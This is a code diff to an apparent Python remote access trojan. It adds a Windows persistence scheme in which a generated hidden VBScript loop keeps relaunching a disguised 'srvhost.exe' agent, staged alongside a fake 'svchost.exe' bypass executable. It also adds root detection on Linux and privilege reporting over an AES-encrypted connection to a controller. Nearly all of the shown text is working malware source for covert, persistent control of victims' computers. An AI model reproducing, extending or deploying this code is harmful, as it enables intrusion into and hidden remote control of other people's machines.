@@ -147,11 +147,23 @@ if platform.machine()[-2:] == '64':
 	is64 = True
 
 if os.name == 'nt':
-	tempvbs = os.getenv('TEMP') + os.sep + 'h.vbs'
-	tempbat = os.getenv('TEMP') + os.sep + 'c.bat'
-	bypassexe = os.getenv('TEMP') + os.sep + 'svchost.exe'
+	###################################################################################################
+	## Variables for windows:																		 ##
+	# These will be deleted straight after use:														  #
+
+	tempvbs = os.getenv('TEMP') + '%sh.vbs' % (os.sep)
+	tempbat = os.getenv('TEMP') + '%sc.bat' % (os.sep)
+	bypassexe = os.getenv('TEMP') + '%ssvchost.exe' % (os.sep)
+
+	# These are permanent (used for persistence):
+	
 	agent = os.getenv('WINDIR') + '%sIME%simekr8%sdicts%ssrvhost.exe' % (os.sep, os.sep, os.sep, os.sep)
-	vbsdst = os.getenv('APPDATA') + os.sep + '..' + os.sep + 'Local' + os.sep + 'alloc.vbs'
+	agentname = agent.split(os.sep)[-1]
+	vbsdst = os.getenv('APPDATA') + '%s..%sLocal%salloc.vbs' % (os.sep, os.sep, os.sep)
+
+	#																								  #
+	###################################################################################################
+
 	pwdvar = 'cd'
 	adm = fsubprocess('whoami').strip('**n').strip('**r')
 	stdout = fsubprocess('net localgroup administrators | find "%USERNAME%"').strip('**n').strip('**r')
@@ -169,7 +181,7 @@ if os.name == 'nt':
 			pass
 	else:
 		if isAdmin:
-			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "srvhost.exe" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """C:\Windows\IME\imekr8\dicts\srvhost.exe""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
 			with open(vbsdst, 'w') as pv:
 				pv.write(vbscript)
 			win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -188,6 +200,8 @@ if os.name == 'nt':
 			fbypass(rcmd)
 			exit()
 else:
+	if os.getuid() == 0:
+		isSystem = True
 	pwdvar = 'pwd'
 
 s.connect((host, port))
@@ -213,12 +227,19 @@ if os.name == 'nt':
 			else:
 				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s' % (paddedopsys, starpadding))
 elif os.name == 'posix':
-	if is64:
-		success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s' % (paddedopsys, starpadding))
+	if isSystem:
+		if is64:
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s' % (paddedopsys, starpadding))
+		else:
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s' % (paddedopsys, starpadding))
 	else:
-		success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s' % (paddedopsys, starpadding))
+		if is64:
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s' % (paddedopsys, starpadding))
+		else:
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s' % (paddedopsys, starpadding))
 else:
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s' % (paddedopsys, starpadding))
+
 s.send(success)
 pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 
@@ -513,6 +534,8 @@ while True:
 		if decrypted[142:143] == 'A':
 			isAdmin = True
 		if decrypted[142:143] == 'S':
+			isSystem = True
+		if decrypted[141:142] == 'S':
 			isSystem = True
 		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
 		if isSystem:
